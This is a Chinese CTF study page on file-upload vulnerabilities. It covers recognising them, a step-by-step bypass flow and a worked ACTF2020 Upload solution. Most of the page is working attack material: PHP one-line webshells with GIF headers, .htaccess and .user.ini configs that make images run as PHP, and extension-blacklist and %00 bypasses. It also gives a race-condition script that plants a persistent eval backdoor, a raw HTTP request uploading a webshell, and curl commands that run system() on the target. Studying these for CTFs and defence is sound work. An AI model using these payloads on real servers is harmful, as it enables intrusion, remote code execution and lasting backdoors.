# 文件上传

关键词：文件上传 上传漏洞 后缀绕过 MIME htaccess user.ini 图片马 条件竞争 解析漏洞 一句话木马

## ① 识别指纹

- 页面有头像上传、附件上传、图片导入、编辑器插图、批量导入
- 题干出现 **"上传"、"头像"、"附件"、"webshell"、"拿到 shell"**
- 上传成功后返回一个可访问的 URL（`/upload/xxx.png`）→ 记住这个路径，后面所有判断都靠它
- 附件给源码，能看到 `move_uploaded_file`、`$_FILES`、`pathinfo`、`in_array($ext, ...)`、`getimagesize`、`exif_imagetype`
- 附件里有 `.htaccess`、`.user.ini`、`php.ini` 相关字样 → 这题考配置文件
- 题目同时给了上传点和 `?file=` 包含点 → 图片马组合，见 [/web/file-inclusion](/web/file-inclusion)
- 题目名带 Upload / BabyUpload / 文件上传 / 头像
- 上传目录可执行 PHP，且返回的路径能直接访问 → 最省事的一类

## ② 考什么

- 前端 JS 校验：`onsubmit="return checkFile()"`、`accept=".jpg"` 的绕过
- MIME 校验：`Content-Type` 与 `$_FILES['file']['type']`
- 后缀黑名单：`.php` 之外还有 `.phtml`、`.php3`、`.php5`、`.pht`、`.phar`、大小写、末尾点、空格、`::$DATA`
- 后缀白名单与路径拼接：`shell.php.jpg`、`shell.jpg.php`
- 文件头/魔术字节：`GIF89a`、PNG 头，以及 `getimagesize` / `exif_imagetype`
- 内容过滤：`<?` 被删 → 用 `<script language="php">`（PHP 5 专属）
- `.htaccess`：`AddType`、`SetHandler`、`php_value auto_prepend_file`
- `.user.ini`：`auto_prepend_file` / `auto_append_file`，需 PHP-FPM 且同目录已有 php 文件
- 图片马 + 文件包含：不依赖后缀解析
- 条件竞争：上传 → 校验 → 删除之间的时间窗
- `%00` 截断：PHP < 5.3.4 的历史特性
- 解析漏洞：Apache 多后缀、Nginx 路径信息、IIS 分号与短名

## ③ 判断流程

> 这题的胜负手是"先过校验，再确认能不能解析"。两件事分开测，别混在一起。

1. **找上传点并读前端校验**：F12 看表单的 `onsubmit`、引用的 `.js`，把允许的后缀列出来 → 直接传一个 `.php` 试 → 成功 → 进 7；被前端弹窗拦住 → 进 2
2. **过前端**：Console 里把校验函数置空（`checkFile = () => true`），或用 Burp 截包改 `filename` → 请求到达后端并返回结果 → 进 3
3. **读后端报错文案**：是"文件类型不允许/后缀不对" → 进 4；是"不是图片/内容非法" → 进 5；是"文件太大" → 先把文件压到几百字节再回 2
4. **过 MIME**：Burp 把 `Content-Type` 改成 `image/gif`（或 `image/png`）→ 上传成功 → 进 7；仍被拒 → 进 5
5. **过文件头**：文件开头加 `GIF89a`（或真 1x1 GIF 末尾拼 PHP）→ 上传成功 → 进 7；仍被拒 → 进 6
6. **兜底**：第 1–5 条全部被拒 → 回到第 1 条，换入口重看：多文件字段、压缩包上传、base64 上传、远程 URL 导入、换一个上传功能；确认只有一个单文件入口后再回 2
7. **确认能否解析**：访问返回的路径，把扩展名换成 `.php` 也试一次 → 返回命令执行结果 → 进 13；返回 PHP 源码、404、或被当图片下载 → 进 8
8. **换后缀**：`.php` 被黑名单 → 依次试 `.phtml`、`.php3`、`.php5`、`.pht`、`.phar`、`.PHP`、`.php.`、`.php%20`、`.php::$DATA`（Windows）→ 有一个能执行 → 进 13；全部不执行 → 进 9
9. **上配置文件**：后缀全被拦 → 传 `.htaccess`（`AddType application/x-httpd-php .jpg`）或 `.user.ini`（`auto_prepend_file=shell.jpg`）→ 配置文件落地且目录内有可访问的 php 文件 → 再传图片马 → 进 13；配置文件被拒或不生效 → 进 10
10. **走文件包含**：题目另有 `?file=` 一类参数 → 传图片马，让包含点去包含它，完全不依赖后缀解析 → 进 13
11. **条件竞争**：上传成功但文件被立刻删除，且删除前有可访问窗口 → 上传一个"执行时自己写持久马"的文件，用脚本高频上传 + 高频访问抢时间窗 → 抢到一次 → 进 13
12. **截断**：确认 PHP < 5.3.4 且文件名参与路径拼接 → `shell.php%00.jpg`，让 `%00` 截断后续校验 → 进 13
13. **拿执行**：先 `system('id')` 确认权限，再 `cat /flag`、`ls /`、`find / -name '*flag*'` → 读到 flag 结束
14. **兜底**：以上都不成立 → 回到第 1 条，把"上传"重新归类：能指定远程 URL 的转 [/web/ssrf](/web/ssrf)，能传 zip 的查 zip slip，能传 XML 的转 [/web/xxe](/web/xxe)

## ④ 工具与命令

```bash
# 1. 前端校验：Console 里直接废掉，别浪费时间改文件
#    checkFile = () => true
#    或者干脆删掉 <form> 的 onsubmit 属性

# 2. 造一个带图片头的马（单引号内 $ 不会被 shell 展开）
printf 'GIF89a<?php system("cat /flag");?>' > shell.gif
xxd shell.gif | head -2        # 前 6 字节应为 47 49 46 38 39 61

# 3. 绕过网页，直接发 multipart；一次改全三处：文件名、MIME、文件头
curl -F "file=@shell.phtml;type=image/gif" "http://t.cn/upload.php"
```

```apache
# .htaccess：让 .jpg 被 PHP 解析（Apache + AllowOverride All）
AddType application/x-httpd-php .jpg
```

```ini
; .user.ini：进入该目录的每个 PHP 请求前自动包含 shell.jpg
; GIF89a 这一行是为了过图片头校验，无图片校验时可以不写
GIF89a
auto_prepend_file=shell.jpg
```

```php
<?php
// 条件竞争用的马：被执行一次就把持久后门写到同目录
file_put_contents('persist.php', '<?php eval($_POST[1]);?>');
```

```bash
# 条件竞争：终端 1 死命上传，终端 2 死命请求
while true; do curl -s -F "file=@race.php" "http://t.cn/upload.php" -o /dev/null; done
while true; do curl -s "http://t.cn/upload/race.php"; done
# 一旦 persist.php 出现，停手，改用持久马
curl -s -d "1=system('id');" "http://t.cn/upload/persist.php"
```

```text
# %00 截断（仅 PHP < 5.3.4，现代环境已修复，作为历史知识）
filename="shell.php%00.jpg"  → 落盘时截断为 shell.php
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 前端改了后缀仍提示错误 | 后端还有 MIME/文件头校验 | Burp 里一次改全：文件名、`Content-Type`、文件头 |
| 上传成功但访问 404 | 返回的路径不是真实路径，文件被重命名或放进随机目录 | 看响应 body 里的真实路径，再访问 |
| 访问返回的是源码 | 上传目录没配 PHP 解析 | 转文件包含，或找可执行目录 |
| `.htaccess` 上传成功但不生效 | Apache 没开 `AllowOverride`，或服务是 Nginx | 改 `.user.ini`（需 PHP-FPM）或走图片马 |
| `.user.ini` 不生效 | 目录内没有 php 文件，或 `user_ini.cache_ttl` 还没到 | 确保目录有可访问的 php，等 300 秒或换目录 |
| 文件传上去几秒就没了 | 有定时清理或人工审核 | 抢时间窗，或让马自己写持久文件 |
| 加了 `GIF89a` 还是报"不是图片" | 校验的是 `exif_imagetype` 或真实图像结构 | 用真实 1x1 GIF/PNG，在文件末尾拼 PHP 代码 |
| `.php` 失败但 `.php::$DATA` 成功 | NTFS 备用数据流 | 只在 Windows 目标上试这一条 |

## ⑥ 例题

**题目**：`[ACTF2020 新生赛] Upload`
**来源**：BUUCTF 复现（原题出自 ACTF 2020 新生赛）
**题干**（大意）：一个上传页面，提示上传图片；flag 在服务器上。

**关键观察**：上传按钮是隐藏的（悬停/点击小灯泡才出现），页面引用的 `main.js` 里 `checkFile()` 只放行 `.jpg|.png|.gif`——这是**纯前端校验**。绕过它之后后端报 `nonono~ Bad file!`，说明后端还有一层 MIME + 后缀的组合校验。

**走了哪条链**：第 1 条（发现前端 JS 校验）→ 第 2 条（Burp 改 `filename` 绕过）→ 第 3 条（后端报 `Bad file!`，指向 MIME 与后缀）→ 第 4 条（`Content-Type: image/jpeg`）→ 第 8 条（`.php` 被拦，换 `.phtml`）→ 第 13 条（连上后读 flag）。

**命令与输出**：

```http
POST /upload.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/jpeg

<?php @eval($_POST[1]);?>
------x--
```

```text
HTTP/1.1 200 OK
Upload Success! Look here~ ./uplo4d/<hash>.phtml
```

```bash
# 用返回的路径验证执行（目录名与文件名以响应为准）
curl -s -d "1=system('id');" "http://target/uplo4d/<hash>.phtml"
# 输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s -d "1=system('cat /flag');" "http://target/uplo4d/<hash>.phtml"
```

**结果**：在根目录读到 flag。若直接 `cat /flag` 为空，先 `ls /` 或 `find / -name '*flag*' 2>/dev/null` 确认位置。

::: tip flag 说明
flag 随 BUU 实例生成，以原题平台为准。这道题的价值是把"三层校验"拆开：**前端 JS → MIME → 后缀黑名单**，每层只需一个动作验证。想练配置文件那条线，做 `[SUCTF 2019] CheckIn`：`<?` 被过滤时用 `<script language="php">`，并用 `.user.ini` 的 `auto_prepend_file` 让图片马被自动包含。
:::
